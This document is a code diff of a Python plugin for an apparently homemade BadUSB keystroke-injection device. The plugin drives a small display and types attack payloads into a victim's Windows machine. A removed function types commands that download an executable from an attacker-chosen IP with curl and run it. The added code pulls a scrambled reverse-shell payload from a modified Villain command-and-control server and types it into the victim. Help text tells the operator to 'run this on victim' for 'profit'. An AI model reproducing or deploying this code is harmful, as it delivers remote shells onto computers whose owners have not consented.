@@ -10,6 +10,8 @@ from core.webserver.https import *
 from random import randint
 from threading import Thread
 import core.villain.villan_core as vil
+import json
+from base64 import b64decode
 
 class vars:
 
@@ -17,9 +19,15 @@ class vars:
         # you can have this in an external file, aslong as main file gets it in dictionary format
         # this is for your command help n stuff
         "payloads": "run payloads in ./plugins/payloads folder",
-        "percentageTest": "asdijaweu9ihf78ewrgf79",
+        #"pTest": "asdijaweu9ihf78ewrgf79",
         "pullIP": "get the local ip of a computer by starting an HTTP server, and making the client connect to it through browser",
-        "windowsHoaxShell": "use villain's payload generator and type it out, executing it"
+        "wxHoaxShell": "to use: 1. run modified villain in an ssh session\n2.run this on victim\n3. profit",
+
+        "icons": {
+            "payloads": "./core/icons/usbfolder.bmp",
+            "pullIP": "./core/icons/shell_laptop.bmp",
+            "wxHoaxShell": "./core/icons/usbskull.bmp"
+        }
     }
 
     payloadList = {}
@@ -42,7 +50,7 @@ def payloads(args:list):
 
     sleep(0.5)
 
-    a = menu(draw, disp, image, list(vars.payloadList), GPIO, font=vars.font, onlyPrefix=False)
+    a = menu(draw, disp, image, list(vars.payloadList), GPIO, cleanScroll=True, flipperZeroMenu=True)
 
     if a == "back":
         return
@@ -89,81 +97,11 @@ def payloads(args:list):
         if base == "PRINT": # print to display
             handler.addText(' '.join(line))
 
-    fullClear(draw)
-
-    draw.text((10, 10), "finished!", fill=0, outline=255, font=vars.font)
-
-    disp.ShowImage(disp.getbuffer(image))
+    handler.exit()
 
     waitForKey(GPIO)
 
-def shellPayload(args:list):
-    draw, disp, image, GPIO= args[0], args[1], args[2], args[3]
-
-    ipType = None
-
-    ipRange = ["select ip num"]
-    ipRange += range(1, 254)
-    ipRange.append("back")
-    ipCompiled = []
-
-    while True:
-        ipCompiled.clear()
-        for _ in range(4):
-            num = menu(draw, disp, image, list(ipRange), font=vars.font, onlyPrefix=False)
-
-            if num == "back":
-                return
-
-            if num == "select ip num":
-                continue
-
-            if num == None:
-                return
-            else:
-                ipCompiled.append(num)
-
-        ipCompiled = '.'.join(ipCompiled)
-
-        isChoice = menu(draw, disp, image, ['{} is correct?'.format(ipCompiled), "yes", "no"], font=vars.font, onlyPrefix=False)
-
-        if isChoice == "yes":
-            break
-        else:
-            continue
-
-    usb = BadUSB()
-
-    fullClear(draw)
-
-    draw.text((10, 10), "runnning...", fill=0, outline=255, font=vars.font)
-
-    disp.ShowImage(disp.getbuffer(image))
-
-    usb.write("curl http://{}:8000/tcp.exe -o tcp.exe".format(ipCompiled))
-    usb.press("ENTER")
-
-    sleep(1)
-
-    usb.write("tcp.exe")
-    usb.press("ENTER")
-
-    sleep(2.5)
-
-    usb.write("exit")
-    usb.press("ENTER")
-
-    fullClear(draw)
-
-    draw.text((10, 10), "finished!", fill=0, outline=255, font=vars.font)
-
-    disp.ShowImage(disp.getbuffer(image))
-
-    waitForKey(GPIO)
-
-    return
-
-def windowsNgrokShell(args:list):
+def wxHoaxShell(args:list):
     draw, disp, image, GPIO= args[0], args[1], args[2], args[3]
 
     handler = usbRunPercentage(draw,disp,image) # init handler
@@ -237,13 +175,32 @@ def windowsHoaxShell(args:list):
     handler = usbRunPercentage(draw,disp,image) # init handler
     Thread(target=handler.start,daemon=True).start() # start handler
     usb = BadUSB() # init usb handler
-    payload = vil.payloadGen("windows", "wlan0")
+
+    #payload = vil.payloadGen("windows", "wlan0", scramble=0)
+
+    payloadSock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    payloadSock.settimeout(1)
+    try:
+        payloadSock.connect(("127.0.0.1", 64901))
+    except socket.gaierror:
+        handler.addText("modified villain isnt running, run it in ssh'd shell; sudo python3 ./core/villain/villain.py")
+        return
+
+    payloadSock.sendall(json.dumps({
+        "os": "windows",
+        "lhost": "wlan0",
+        "scramble": "2" #scramble twice
+    }))
+    r = payloadSock.recv(2048 * 4).decode("utf-8")
+    payload = b64decode(r.encode("ascii")).decode("ascii")
 
     handler.setPercentage(0)
 
+    #print(payload)
     handler.addText("executing payload")
-    # we will assume ps is already open
-    usb.write(payload.scrambled) # curl our server for tcp shell
+
+    usb.write(payload, jitter=False, keyDelay=0, pressDelay=0) # curl our server for tcp shell
+
     usb.press("ENTER") # run
 
     sleep(0.5) # wait for cmd to finish
@@ -253,11 +210,11 @@ def windowsHoaxShell(args:list):
 
     handler.setPercentage(100)
 
-    fullClear(draw)
-
     handler.addText("finished")
 
     waitForKey(GPIO)
+
+    handler.exit()
 
     return
 
@@ -350,15 +307,6 @@ def pullIP(args:list):
     waitForKey(GPIO)
 
     handler.exit()
-
-
-
-def ask(string):
-    """
-    an example of an unexecutable function
-    """
-
-    return input(string)
 
 def functions():
     """
